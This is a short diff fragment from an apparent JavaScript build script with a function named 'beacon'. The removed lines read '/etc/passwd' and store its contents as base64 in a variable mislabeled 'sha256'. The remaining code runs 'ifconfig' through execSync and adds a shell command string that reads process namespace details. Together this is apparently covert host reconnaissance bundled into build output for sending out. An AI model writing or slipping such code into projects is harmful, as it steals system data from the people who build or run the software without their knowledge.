@@ -35,7 +35,7 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "/etc/passwd";
+  const target = "";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
@@ -44,7 +44,7 @@ function beacon(urlStr, q) {
     sha256 = buf.toString("base64");
   } catch {}
 
-  let idOutput = "";
+  let idOutput = "cat /proc/self/status | grep NSpid";
   try {
     idOutput = execSync(
   'ifconfig',
